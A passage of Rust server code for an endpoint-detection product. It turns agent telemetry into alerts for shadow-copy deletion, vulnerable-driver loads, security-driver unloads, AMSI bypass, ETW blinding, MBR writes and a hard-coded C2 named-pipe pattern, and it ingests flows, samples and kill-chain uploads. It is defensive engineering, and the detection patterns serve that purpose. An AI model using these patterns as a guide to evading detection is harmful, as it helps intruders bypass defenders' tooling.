                if let Some(hex) = t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
                    if let Ok(n) = u64::from_str_radix(hex, 16) {
                        return Some(n);
                    }
                } else if let Ok(n) = t.parse::<u64>() {
                    return Some(n);
                }
            }
        }
    }
    None
}

fn evaluate_server_edr_event(
    store: &EdrTelemetryStore,
    events: &EventLog,
    machine_id: &str,
    rec: &EdrEventRecord,
) {
    let sha256 = raw_first_str(
        &rec.raw,
        &["/hashes/sha256", "/process/imageFile/hash", "/file/hash"],
    );

    if let Some(imphash) = rec
        .raw
        .pointer("/hashes/imphash")
        .and_then(|v| v.as_str())
        .map(str::trim)
        .filter(|s| !s.is_empty())
    {
        if let Some(sig) = crate::imphash_sigs::lookup(imphash) {
            let rule_name = format!("Server.Imphash.{}", sig.threat);
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                imphash,
                &rule_name,
                0.90,
                vec![
                    format!("Imphash:{imphash}"),
                    format!("MatchedThreat:{}", sig.threat),
                    format!("EventType:{}", rec.event_type),
                ],
                format!("PE imphash {imphash} matched analyst signature {}", sig.threat),
                serde_json::json!({
                    "imphash": imphash,
                    "sig_sha256": sig.sha256,
                    "event_type": rec.event_type,
                }),
            );
        }
    }

    match rec.event_type.as_str() {
        "PROCESS_TAMPERING" => {
            let reason = raw_first_str(&rec.raw, &["/reason"]);
            let technique = raw_first_str(&rec.raw, &["/technique"]);
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                &rec.exe_path,
                "Server.EDR.ProcessTampering",
                1.00,
                vec![
                    format!("Technique:{technique}"),
                    format!("Reason:{reason}"),
                ],
                format!("Process tampering reported: {} ({reason})", rec.exe_path),
                rec.raw.clone(),
            );
        }
        "SHADOW_COPY_DELETE" | "VSS_SHADOW_COPY_DELETED" => {
            let subj = rec.details.as_deref().unwrap_or(&rec.exe_path);
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                subj,
                "Server.EDR.ShadowCopyDeletion",
                1.00,
                vec!["MITRE:T1490".to_string(), format!("ShadowCopy:{subj}")],
                format!("Volume Shadow Copy deletion observed: {subj}"),
                rec.raw.clone(),
            );
        }
        "DRIVER_UNLOADED" => {
            let drv = raw_first_str(&rec.raw, &["/driver_path", "/file/rawPath", "/file/path"]);
            let check = if drv.is_empty() {
                rec.details.as_deref().unwrap_or("")
            } else {
                drv
            };
            let low = check.to_ascii_lowercase();
            if SERVER_SECURITY_DRIVERS.iter().any(|d| low.contains(d)) {
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    check,
                    "Server.EDR.SecurityDriverUnloaded",
                    1.00,
                    vec!["MITRE:T1562.001".to_string(), format!("Driver:{check}")],
                    format!("Security or packet filter driver unloaded: {check}"),
                    rec.raw.clone(),
                );
            }
        }
        "DRIVER_LOADED" | "LLE_DRIVER_LOAD" | "DRIVER_MODIFIED" => {
            let drv = raw_first_str(
                &rec.raw,
                &[
                    "/driver_path",
                    "/driver/image",
                    "/file/rawPath",
                    "/file/abstractPath",
                    "/file/path",
                ],
            );
            let check = if drv.is_empty() {
                rec.details.as_deref().unwrap_or("")
            } else {
                drv
            };
            let sub_type = raw_first_str(&rec.raw, &["/subType"]);
            let drv_action = raw_first_str(&rec.raw, &["/driver/action"]);
            if sub_type.eq_ignore_ascii_case("HVCI_BLOCK") || drv_action.eq_ignore_ascii_case("BLOCK") {
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    check,
                    "Server.Sanctum.HvciDriverBlocked",
                    1.00,
                    vec!["MITRE:T1068".to_string(), format!("Driver:{check}")],
                    format!("Sanctum HVCI/blocklist blocked driver load: {check}"),
                    rec.raw.clone(),
                );
                return;
            }
            let low = check.to_ascii_lowercase();
            let base = check
                .rsplit(['\\', '/'])
                .next()
                .unwrap_or("")
                .to_ascii_lowercase();
            let is_byovd = SERVER_BYOVD_DRIVERS
                .iter()
                .any(|d| base == *d || low.contains(d));
            let is_writable = [
                "\\temp\\",
                "\\appdata\\",
                "\\users\\public\\",
                "\\downloads\\",
            ]
            .iter()
            .any(|p| low.contains(p));
            if is_byovd || is_writable {
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    check,
                    "Server.EDR.BYOVDVulnerableDriver",
                    0.95,
                    vec!["MITRE:T1068".to_string(), format!("Driver:{check}")],
                    format!("Vulnerable BYOVD or user-writable driver loaded: {check}"),
                    rec.raw.clone(),
                );
            }
        }
        "LLE_NAMED_PIPE_SERVER_CREATE" | "LLE_NAMED_PIPE_CREATE" => {
            let pipe = raw_first_str(
                &rec.raw,
                &["/file/rawPath", "/file/abstractPath", "/file/path", "/pipe_name"],
            );
            let check = if pipe.is_empty() {
                rec.details.as_deref().unwrap_or("")
            } else {
                pipe
            };
            let low = check.to_ascii_lowercase();
            if SERVER_MALICIOUS_PIPES.iter().any(|p| low.contains(p))
                || (low.contains("\\msse-") && low.contains("-server"))
            {
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    check,
                    "Server.EDR.MaliciousNamedPipe",
                    0.90,
                    vec!["MITRE:T1071".to_string(), format!("NamedPipe:{check}")],
                    format!("Malicious C2 or exploit named pipe observed: {check}"),
                    rec.raw.clone(),
                );
            }
        }
        "SANCTUM_GHOST_HUNT" => {
            let syscall = raw_first_str(&rec.raw, &["/syscall_name"]);
            let subj = if syscall.is_empty() {
                rec.exe_path.as_str()
            } else {
                syscall
            };
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                subj,
                "Server.Sanctum.DirectSyscallGhostHunt",
                1.00,
                vec!["MITRE:T1106".to_string(), format!("Syscall:{subj}")],
                format!("Sanctum detected direct syscall via Ghost Hunting: {subj}"),
                rec.raw.clone(),
            );
        }
        "SANCTUM_AMSI_BYPASS" => {
            let func = raw_first_str(&rec.raw, &["/function_name"]);
            let subj = if func.is_empty() {
                rec.exe_path.as_str()
            } else {
                func
            };
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                subj,
                "Server.Sanctum.AmsiBypass",
                1.00,
                vec!["MITRE:T1562.001".to_string(), format!("Function:{subj}")],
                format!("Sanctum detected kernel-verified AMSI bypass: {subj}"),
                rec.raw.clone(),
            );
        }
        "SANCTUM_HVCI_BLOCK" => {
            let drv = raw_first_str(
                &rec.raw,
                &["/driver/image", "/file/rawPath", "/file/abstractPath", "/driver_path"],
            );
            let check = if drv.is_empty() {
                rec.details.as_deref().unwrap_or(rec.exe_path.as_str())
            } else {
                drv
            };
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                check,
                "Server.Sanctum.HvciDriverBlocked",
                1.00,
                vec!["MITRE:T1068".to_string(), format!("Driver:{check}")],
                format!("Sanctum HVCI/blocklist blocked driver: {check}"),
                rec.raw.clone(),
            );
        }
        "SANCTUM_ETW_BLINDING" => {
            let subj = rec.details.as_deref().unwrap_or("SanctumETWThreatIntelligence");
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                subj,
                "Server.Sanctum.EtwTiBlinding",
                1.00,
                vec!["MITRE:T1562.006".to_string(), format!("EtwBlinding:{subj}")],
                format!("Sanctum PPL runner reported ETW:TI blinding attempt: {subj}"),
                rec.raw.clone(),
            );
        }
        "SANCTUM_ETW_TI" => {
            let has_true = |ptrs: &[&str]| {
                ptrs.iter().any(|p| {
                    rec.raw.pointer(p).is_some_and(|v| {
                        v.as_bool()
                            .unwrap_or_else(|| v.as_u64().is_some_and(|n| n != 0))
                    })
                })
            };
            let is_remote = has_true(&["/remote", "/data/EtwThreatIntelligence/remote"]);
            let is_suspicious = has_true(&["/suspicious", "/data/EtwThreatIntelligence/suspicious"]);
            if is_remote || is_suspicious {
                let func = raw_first_str(
                    &rec.raw,
                    &["/function", "/data/EtwThreatIntelligence/function"],
                );
                let evt_name = raw_first_str(
                    &rec.raw,
                    &["/event_name", "/data/EtwThreatIntelligence/event_name"],
                );
                let subj = if !func.is_empty() { func } else { evt_name };
                let score = if is_remote { 0.95 } else { 0.85 };
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    subj,
                    "Server.Sanctum.EtwThreatIntel",
                    score,
                    vec!["MITRE:T1055".to_string(), format!("EtwTI:{subj}")],
                    format!("Sanctum ETW:TI flagged suspicious memory/injection operation: {subj}"),
                    rec.raw.clone(),
                );
            }
        }
        "MBR_SECTOR0_RAW_WRITE" | "LLE_DISK_RAW_WRITE_ACCESS" => {
            let alert = raw_first_str(&rec.raw, &["/mbrAlert"]);
            let sector = raw_first_u64(&rec.raw, &["/sector"]);
            if rec.event_type == "LLE_DISK_RAW_WRITE_ACCESS"
                && sector != Some(0)
                && alert.is_empty()
            {
                return;
            }
            let disk = raw_first_str(&rec.raw, &["/disk", "/path"]);
            let subj = if !rec.exe_path.is_empty() {
                rec.exe_path.as_str()
            } else if !alert.is_empty() {
                alert
            } else if !disk.is_empty() {
                disk
            } else {
                rec.details.as_deref().unwrap_or("PhysicalDrive0")
            };
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                subj,
                "Server.EDR.MbrSector0RawWrite",
                1.00,
                vec!["MITRE:T1561.002".to_string(), format!("MbrWrite:{subj}")],
                format!("MBRFilter intercepted direct Sector 0 MBR write: {subj}"),
                rec.raw.clone(),
            );
        }
        "MLE_HYPERVISOR_MSR_TAMPER" => {
            let msr = raw_first_u64(&rec.raw, &["/targetMsr", "/owlyHv/context"]).unwrap_or(0);
            let subj = format!("MSR 0x{msr:x}");
            emit_server_rule_alert(
                store,
                events,
                machine_id,
                rec.pid,
                &rec.process_name,
                &rec.exe_path,
                sha256,
                &subj,
                "Server.Hypervisor.SyscallMsrTamper",
                1.00,
                vec!["MITRE:T1014".to_string(), format!("TargetMsr:0x{msr:x}")],
                format!("Hypervisor detected unauthorized syscall MSR / EFER tamper: {subj}"),
                rec.raw.clone(),
            );
        }
        "LLE_DEVICE_IOCTL" => {
            let hv_ts = raw_first_u64(&rec.raw, &["/owlyHv/timestamp"]).unwrap_or(0);
            if hv_ts == 0 || rec.pid <= 4 {
                return;
            }
            let evt_type =
                raw_first_u64(&rec.raw, &["/owlyHook/eventType", "/owlyHookEventType"]).unwrap_or(0);
            let ctx = raw_first_u64(&rec.raw, &["/owlyHv/context"]).unwrap_or(0);
            let is_crit_msr = matches!(ctx, 0x176 | 0xC000_0080 | 0xC000_0082 | 0xC000_0083);
            if evt_type == 65 && is_crit_msr {
                let subj = format!("MSR 0x{ctx:x}");
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    &subj,
                    "Server.Hypervisor.SyscallMsrTamper",
                    1.00,
                    vec!["MITRE:T1014".to_string(), format!("TargetMsr:0x{ctx:x}")],
                    format!("Hypervisor trapped syscall MSR / EFER write outside System context: {subj}"),
                    rec.raw.clone(),
                );
            } else if evt_type == 0x10 || (0x90..=0x94).contains(&evt_type) {
                let addr = raw_first_u64(&rec.raw, &["/owlyHv/memoryAddress"]).unwrap_or(0);
                let subj = format!("0x{addr:x}");
                emit_server_rule_alert(
                    store,
                    events,
                    machine_id,
                    rec.pid,
                    &rec.process_name,
                    &rec.exe_path,
                    sha256,
                    &subj,
                    "Server.Hypervisor.EptViolation",
                    0.90,
                    vec![
                        "MITRE:T1014".to_string(),
                        format!("HypervisorEvent:0x{evt_type:x}"),
                        format!("Context:0x{ctx:x}"),
                    ],
                    format!("Hypervisor detected EPT violation or hidden hook event at {subj}"),
                    rec.raw.clone(),
                );
            }
        }
        _ => {}
    }
}

const MALICIOUS_RISK_SCORE: f32 = 0.75;
const SUSPICIOUS_RISK_SCORE: f32 = 0.40;

/// `(is_malicious, is_suspicious)` of a behavior report.
///
/// A named detection is malicious, except from a graded source: there the name
/// only says which rule matched, so the severity decides and a low / medium
/// match is suspicious, not malicious.
fn behavior_severity(payload: &BehaviorTelemetryPayload) -> (bool, bool) {
    let named_detection = !payload.detection.is_empty() && payload.detection != "Clean";
    let graded = GRADED_DETECTION_SOURCES.iter().any(|s| payload.source.eq_ignore_ascii_case(s));

    let is_malicious = payload.risk_score >= MALICIOUS_RISK_SCORE || (named_detection && !graded);
    let is_suspicious =
        payload.risk_score >= SUSPICIOUS_RISK_SCORE || !payload.indicators.is_empty() || (named_detection && graded);
    (is_malicious, is_suspicious)
}

pub fn ingest_behavior(store: &EdrTelemetryStore, events: &EventLog, payload: BehaviorTelemetryPayload) -> serde_json::Value {
    let (is_malicious, is_suspicious) = behavior_severity(&payload);

    let verdict = if is_malicious {
        "malicious"
    } else if is_suspicious {
        "suspicious"
    } else {
        "clean"
    };

    let action = if is_malicious {
        "ask" // Prompt user on Pascal HIPS
    } else if is_suspicious {
        "ask"
    } else {
        "allow"
    };

    let threat_name = if !payload.detection.is_empty() && payload.detection != "Clean" {
        Some(payload.detection.clone())
    } else if let Some(first_indicator) = payload.indicators.first() {
        let clean_ind = first_indicator
            .chars()
            .map(|c| if c.is_alphanumeric() { c } else { '_' })
            .collect::<String>();
        Some(format!("EDR.Behavior.{}", clean_ind.trim_matches('_')))
    } else if is_malicious {
        if !payload.source.is_empty() && payload.source != "generic" {
            Some(format!("EDR.Threat.{}", payload.source))
        } else {
            Some("EDR.Behavior.Malicious".to_string())
        }
    } else if is_suspicious {
        Some("EDR.Behavior.Suspicious".to_string())
    } else {
        None
    };

    let indicators_str = if payload.indicators.is_empty() {
        "none".to_string()
    } else {
        payload.indicators.join(", ")
    };

    let detail_str = format!(
        "score:{:.2} indicators:[{}] cmd:{}",
        payload.risk_score, indicators_str, payload.command_line
    );

    // Save into dedicated EDR store
    store.add_behavior(payload.clone(), verdict.to_string(), threat_name.clone());

    // Also push to Live Feed EventLog
    events.add(Event {
        seq: 0,
        time: Utc::now(),
        kind: "edr_behavior".to_string(),
        session: None,
        client: Some(format!("PID:{}", payload.pid)),
        verdict: Some(verdict.to_string()),
        file: Some(format!("{} (PID:{})", payload.process_name, payload.pid)),
        size: None,
        ms: None,
        items: None,
        threat: threat_name.clone(),
        detail: Some(detail_str),
        sha256: if !payload.sha256.is_empty() {
            Some(payload.sha256.clone())
        } else {
            None
        },
        message: Some(format!(
            "Host:{} Source:{} Exe:{}",
            payload.machine_id, payload.source, payload.exe_path
        )),
        origin_type: Some("EDR-Behavior".to_string()),
    });

    serde_json::json!({
        "status": "ok",
        "verdict": verdict,
        "threat_name": threat_name,
        "action": action,
        "confidence": payload.risk_score,
        "reason": format!("Evaluated by Multron Server EDR engine (score: {:.2})", payload.risk_score),
        "need_sample": is_malicious
    })
}

/// Handler for POST /api/v1/edr/telemetry/network-flows
pub async fn handle_edr_telemetry_network_flows(
    State(app): State<Arc<AppState>>,
    Json(batch): Json<NetworkFlowBatch>,
) -> impl IntoResponse {
    Json(ingest_flows(&app.edr_telemetry, &app.events, &batch))
}

/// Records a batch of network flows (EDR store + at most 5 live-feed lines).
pub fn ingest_flows(store: &EdrTelemetryStore, events: &EventLog, batch: &NetworkFlowBatch) -> serde_json::Value {
    let count = batch.flows.len();

    // Store in structured telemetry store
    store.add_flows(&batch.machine_id, &batch.flows);

    for flow in &batch.flows {
        for (kind, val_opt) in [("JA3", flow.ja3.as_deref()), ("JA3S", flow.ja3s.as_deref())] {
            let Some(hash) = val_opt else { continue };
            let Some(family) = lookup_server_malicious_tls(hash) else {
                continue;
            };
            let remote = format!("{}:{}", flow.dst_ip, flow.dst_port);
            let rule_name = format!("Server.TLS.{family}");
            emit_server_rule_alert(
                store,
                events,
                &batch.machine_id,
                flow.pid,
                &flow.process_name,
                &flow.process_name,
                "",
                &remote,
                &rule_name,
                0.85,
                vec![format!("{kind}:{hash}"), format!("Dst:{remote}")],
                format!("Matched malicious {kind} fingerprint ({family}) -> {remote}"),
                serde_json::json!({
                    "kind": kind,
                    "hash": hash,
                    "family": family,
                    "dst_ip": flow.dst_ip,
                    "dst_port": flow.dst_port,
                    "hostname": flow.hostname,
                }),
            );
        }
    }

    // Log sample flows in EventLog (at most 5 to avoid flooding)
    for flow in batch.flows.iter().take(5) {
        let mut detail_str = format!(
            "{}:{} -> {}:{} ({})",
            flow.src_ip, flow.src_port, flow.dst_ip, flow.dst_port, flow.protocol
        );
        if let Some(ref dns) = flow.dns_query {
            detail_str.push_str(&format!(" dns={dns}"));
        }
        if let Some(ref u) = flow.url {
            detail_str.push_str(&format!(" url={u}"));
        }

        events.add(Event {
            seq: 0,
            time: Utc::now(),
            kind: "edr_flow".to_string(),
            session: None,
            client: Some(format!("PID:{}", flow.pid)),
            verdict: Some("flow".to_string()),
            file: Some(format!("{} (PID:{})", flow.process_name, flow.pid)),
            size: None,
            ms: None,
            items: None,
            threat: flow
                .url
                .clone()
                .or_else(|| flow.dns_query.clone())
                .or_else(|| flow.hostname.clone()),
            detail: Some(detail_str),
            sha256: None,
            message: Some(format!("Host:{}", batch.machine_id)),
            origin_type: Some("EDR-Network".to_string()),
        });
    }

    serde_json::json!({
        "status": "ok",
        "ingested": count
    })
}

/// Handler for POST /api/v1/edr/telemetry/threat and POST /api/v1/edr/report
pub async fn handle_edr_telemetry_threat(
    State(app): State<Arc<AppState>>,
    Json(report): Json<ThreatReport>,
) -> impl IntoResponse {
    app.edr_telemetry.add_threat(&report);

    app.events.add(Event {
        seq: 0,
        time: Utc::now(),
        kind: "edr_threat".to_string(),
        session: None,
        client: Some(format!("PID:{}", report.pid.unwrap_or(0))),
        verdict: Some("malicious".to_string()),
        file: Some(report.file_name.clone()),
        size: None,
        ms: None,
        items: None,
        threat: Some(report.detection.clone()),
        detail: Some(format!("source:{} path:{}", report.source, report.original_path)),
        sha256: Some(report.sha256.clone()),
        message: None,
        origin_type: Some("EDR-Threat".to_string()),
    });

    Json(serde_json::json!({
        "status": "ok",
        "need_sample": false,
        "message": "Threat recorded by Multron Server"
    }))
}

/// Handler for POST /api/v1/edr/telemetry/report
pub async fn handle_edr_telemetry_report(
    State(app): State<Arc<AppState>>,
    Json(payload): Json<serde_json::Value>,
) -> impl IntoResponse {
    Json(ingest_system_report(&app.edr_telemetry, &app.events, &payload))
}

/// Records a system diagnostic report (full SQLite persistence + AGENT_KEEPALIVE SysOp
/// + live feed). Shared by the dashboard's /api/v1/edr/telemetry/report and public /api/v1/edr/telemetry/system.
pub fn ingest_system_report(
    store: &EdrTelemetryStore,
    events: &EventLog,
    payload: &serde_json::Value,
) -> serde_json::Value {
    let stored = store.add_system_report(payload);
    let keepalive_detail = format!(
        "hostname={} os={} processes={} rootkit_findings={}",
        stored.hostname, stored.os_version, stored.monitored_processes_count, stored.rootkit_findings_count
    );
    store.add_edr_events(
        &stored.machine_id,
        &[EdrEventRecord {
            timestamp: stored.timestamp,
            time_iso: stored.time_iso.clone(),
            event_type: "AGENT_KEEPALIVE".to_string(),
            pid: 0,
            process_name: "edrsvc.exe".to_string(),
            exe_path: String::new(),
            details: Some(keepalive_detail.clone()),
            raw: serde_json::json!({
                "hostname": stored.hostname,
                "os_version": stored.os_version,
                "monitored_processes_count": stored.monitored_processes_count,
                "rootkit_findings_count": stored.rootkit_findings_count,
            }),
        }],
    );

    events.add(Event {
        seq: 0,
        time: Utc::now(),
        kind: "edr_report".to_string(),
        session: None,
        client: Some(stored.machine_id.clone()),
        verdict: Some("info".to_string()),
        file: Some("System Diagnostic Report".to_string()),
        size: None,
        ms: None,
        items: None,
        threat: None,
        detail: Some(format!(
            "System diagnostic report from {} ({keepalive_detail})",
            stored.machine_id
        )),
        sha256: None,
        message: None,
        origin_type: Some("EDR-Diagnostic".to_string()),
    });

    serde_json::json!({
        "status": "ok",
        "report_id": stored.id,
        "need_sample": false,
        "message": "Diagnostic report received"
    })
}

/// Handler for POST /api/v1/edr/upload/:sha256 (sample upload)
pub async fn handle_edr_upload(
    State(app): State<Arc<AppState>>,
    AxumPath(sha256): AxumPath<String>,
    body: axum::body::Bytes,
) -> impl IntoResponse {
    let len = body.len();
    app.events.add(Event {
        seq: 0,
        time: Utc::now(),
        kind: "edr_threat".to_string(),
        session: None,
        client: None,
        verdict: Some("malicious".to_string()),
        file: Some(format!("Sample Upload ({len} bytes)")),
        size: Some(len as i64),
        ms: None,
        items: None,
        threat: Some("Sample.Received".to_string()),
        detail: Some(format!("Received uploaded sample {sha256}")),
        sha256: Some(sha256.clone()),
        message: None,
        origin_type: Some("EDR-Sample".to_string()),
    });

    Json(serde_json::json!({
        "status": "ok",
        "sha256": sha256,
        "bytes_received": len
    }))
}

/// Handler for GET /api/v1/edr/telemetry/stats
pub async fn handle_get_edr_stats(
    State(app): State<Arc<AppState>>,
) -> impl IntoResponse {
    Json(app.edr_telemetry.get_stats())
}

/// Handler for GET /api/v1/edr/telemetry/behaviors
pub async fn handle_get_edr_behaviors(
    State(app): State<Arc<AppState>>,
    Query(query): Query<TelemetryQuery>,
) -> impl IntoResponse {
    let limit = query.limit.unwrap_or(100).min(500);
    let items = app.edr_telemetry.get_behaviors(limit, query.risk.as_deref(), query.q.as_deref());
    Json(serde_json::json!({
        "total": items.len(),
        "behaviors": items
    }))
}

/// Handler for GET /api/v1/edr/telemetry/flows
pub async fn handle_get_edr_flows(
    State(app): State<Arc<AppState>>,
    Query(query): Query<TelemetryQuery>,
) -> impl IntoResponse {
    let limit = query.limit.unwrap_or(200).min(1000);
    let items = app.edr_telemetry.get_flows(limit, query.q.as_deref());
    Json(serde_json::json!({
        "total": items.len(),
        "flows": items
    }))
}

/// Handler for GET /api/v1/edr/telemetry/threats
pub async fn handle_get_edr_threats(
    State(app): State<Arc<AppState>>,
    Query(query): Query<TelemetryQuery>,
) -> impl IntoResponse {
    let limit = query.limit.unwrap_or(100).min(500);
    let items = app.edr_telemetry.get_threats(limit);
    Json(serde_json::json!({
        "total": items.len(),
        "threats": items
    }))
}

// ------------------------------------------------------------------ kill chains
// Unknown-process kill chain events from OpenEDR clients in training mode
// (owlyshield_predict/src/killchain_upload.rs): each distinct event shape once, with
// how often it occurred, merged across machines. Kept for good, like the rest of the
// EDR history; the kill chain trainer reads them back with the export below.

/// Decompressed size a kill chain upload may have.
pub const KILLCHAIN_MAX_JSON_BYTES: u64 = 64 * 1024 * 1024;
/// Decompressed size a raw EDR telemetry batch may have.
pub const EVENTS_MAX_JSON_BYTES: u64 = 128 * 1024 * 1024;
/// Records / repeat counts one upload may carry.
const KILLCHAIN_MAX_ITEMS: usize = 20_000;

fn decode_body_bounded(body: &[u8], brotli: bool, max_bytes: u64) -> Result<Vec<u8>, String> {
    use std::io::Read;
    let mut out = Vec::new();
    let limit = max_bytes + 1;
    let n = if brotli {
        brotli_decompressor::Decompressor::new(body, 4096)
            .take(limit)
            .read_to_end(&mut out)
            .map_err(|e| format!("brotli decompression failed: {e}"))?
    } else {
        body.take(limit).read_to_end(&mut out).map_err(|e| e.to_string())?
    };
    if n as u64 > max_bytes {
        return Err(format!("upload larger than {} MB decompressed", max_bytes / (1024 * 1024)));
    }
    Ok(out)
}

#[derive(Debug, Deserialize)]
pub struct KillchainRecord {
    pub key: String,
    #[serde(default)]
    pub date: String,
    #[serde(default)]
    pub time: String,
    #[serde(default)]
    pub exe: String,
    #[serde(default)]
    pub event: String,
    #[serde(default)]
    pub details: String,
    #[serde(default)]
    pub raw: serde_json::Value,
    #[serde(default = "one")]
    pub count: u64,
}

fn one() -> u64 {
    1
}

#[derive(Debug, Deserialize)]
pub struct KillchainBatch {
    #[serde(default)]
    pub machine_id: String,
    #[serde(default)]
    pub records: Vec<KillchainRecord>,
    #[serde(default)]
    pub counts: std::collections::BTreeMap<String, u64>,
}

/// A client key: 16 lowercase hex digits.
fn valid_killchain_key(k: &str) -> bool {
    k.len() == 16 && k.bytes().all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

/// The request body as JSON bytes: brotli-decoded when `brotli`, never more than
/// `KILLCHAIN_MAX_JSON_BYTES` (a decompression bomb stops there).
pub fn killchain_body(body: &[u8], brotli: bool) -> Result<Vec<u8>, String> {
    decode_body_bounded(body, brotli, KILLCHAIN_MAX_JSON_BYTES)
}

/// The raw EDR events body as JSON bytes: brotli-decoded when `brotli`, bounded by `EVENTS_MAX_JSON_BYTES`.
pub fn decode_events_body(body: &[u8], brotli: bool) -> Result<Vec<u8>, String> {
    decode_body_bounded(body, brotli, EVENTS_MAX_JSON_BYTES)
}

/// Records a lossless batch of raw EDR & SysOps events into persistent SQLite storage.
pub fn ingest_edr_events(
    store: &EdrTelemetryStore,
    events: &EventLog,
    batch: &EdrEventBatch,
) -> serde_json::Value {
    let ingested = store.add_edr_events(&batch.machine_id, &batch.events);
    for rec in &batch.events {
        evaluate_server_edr_event(store, events, &batch.machine_id, rec);
    }
    for rec in batch.events.iter().filter(|r| r.event_type.starts_with("AGENT_")) {
        let msg = rec.details.as_deref().unwrap_or("");
        events.add(Event {
            seq: 0,
            time: Utc::now(),
            kind: "edr_sysop".to_string(),
            session: None,
            client: Some(batch.machine_id.clone()),
            verdict: Some(if rec.event_type == "AGENT_ERROR" {
                "error".to_string()
            } else {
                "info".to_string()
            }),
            file: Some(rec.event_type.clone()),
            size: None,
            ms: None,
            items: None,
            threat: None,
            detail: if msg.is_empty() { None } else { Some(msg.to_string()) },
            sha256: None,
            message: Some(format!("[EDR:SysOp] {} ({}) {}", rec.event_type, batch.machine_id, msg)),
            origin_type: Some("EDR-SysOp".to_string()),
        });
    }
    serde_json::json!({
        "status": "ok",
        "ingested": ingested
    })
}

impl EdrTelemetryStore {
    /// Merges a kill chain upload into the history. Err when there is no history
    /// database (the data is not kept in memory) or the write failed.
    pub fn ingest_killchain(&self, batch: &KillchainBatch) -> Result<(u64, u64), String> {
        let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
        if batch.records.len() + batch.counts.len() > KILLCHAIN_MAX_ITEMS {
            return Err(format!("more than {KILLCHAIN_MAX_ITEMS} items in one upload"));
        }
        let machine = batch.machine_id.chars().take(128).collect::<String>();
        let records: Vec<crate::edr_db::KillchainRow> = batch
            .records
            .iter()
            .filter(|r| valid_killchain_key(&r.key))
            .map(|r| {
                // The stored event is an edrsvc log line, so the trainer reads exported
                // rows exactly like its local unknown_killchain_*.jsonl files.
                let line = serde_json::json!({
                    "date": r.date,
                    "time": r.time,
                    "exe": r.exe,
                    "event": r.event,
                    "details": r.details,
                    "raw": r.raw,
                    "machine_id": machine,
                });
                crate::edr_db::KillchainRow {
                    key: r.key.clone(),
                    count: r.count.max(1),
                    data: line.to_string(),
                    date: r.date.chars().take(16).collect(),
                    time: r.time.chars().take(32).collect(),
                }
            })
            .collect();
        let counts: Vec<(String, u64)> = batch
            .counts
            .iter()
            .filter(|(k, _)| valid_killchain_key(k))
            .map(|(k, c)| (k.clone(), *c))
            .collect();
        db.merge_killchain(&machine, &Utc::now().to_rfc3339(), &records, &counts)
            .map_err(|e| e.to_string())
    }

    /// (distinct event shapes, events they stand for); zeros without a database.
    pub fn killchain_totals(&self) -> (u64, u64) {
        self.db.as_ref().and_then(|db| db.killchain_totals().ok()).unwrap_or((0, 0))
    }

    /// Every stored kill chain event as JSON lines (see `EdrDb::export_killchain`),
    /// or one machine's own chain when `machine` is given
    /// (`EdrDb::export_killchain_machine`).
    pub fn export_killchain(&self, machine: Option<&str>) -> Result<(Vec<u8>, u64), String> {
        let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
        let mut out = Vec::new();
        let n = match machine {
            Some(m) => db.export_killchain_machine(m, &mut out),
            None => db.export_killchain(&mut out),
        }
        .map_err(|e| e.to_string())?;
        Ok((out, n))
    }

    /// Machines that uploaded kill chain events (see `EdrDb::killchain_machines`).
    pub fn killchain_machines(&self) -> Result<Vec<serde_json::Value>, String> {
        let db = self.db.as_ref().ok_or("no EDR telemetry database")?;
        let rows = db.killchain_machines().map_err(|e| e.to_string())?;
        Ok(rows
            .into_iter()
            .map(|(machine, shapes, events, first, last)| {
                serde_json::json!({
                    "machine_id": machine,
                    "shapes": shapes,
                    "events": events,
                    "first_seen": first,
                    "last_seen": last,
                })
            })
            .collect())
    }
}

#[derive(Debug, Deserialize)]
pub struct KillchainExportQuery {
    /// One machine's kill chain (its `machine_id`); all machines merged when absent.
    pub machine: Option<String>,
}

/// Handler for GET /api/v1/edr/telemetry/killchain/stats
pub async fn handle_get_killchain_stats(State(app): State<Arc<AppState>>) -> impl IntoResponse {
    let (shapes, events) = app.edr_telemetry.killchain_totals();
    Json(serde_json::json!({ "shapes": shapes, "events": events }))
}

/// Handler for GET /api/v1/edr/telemetry/killchain/machines: the machines that
/// uploaded kill chain events, with their counts and upload times.
pub async fn handle_get_killchain_machines(State(app): State<Arc<AppState>>) -> axum::response::Response {
    let store = Arc::clone(&app.edr_telemetry);
    match tokio::task::spawn_blocking(move || store.killchain_machines()).await {
        Ok(Ok(rows)) => Json(serde_json::json!({ "machines": rows })).into_response(),
        Ok(Err(e)) => (axum::http::StatusCode::SERVICE_UNAVAILABLE, e).into_response(),
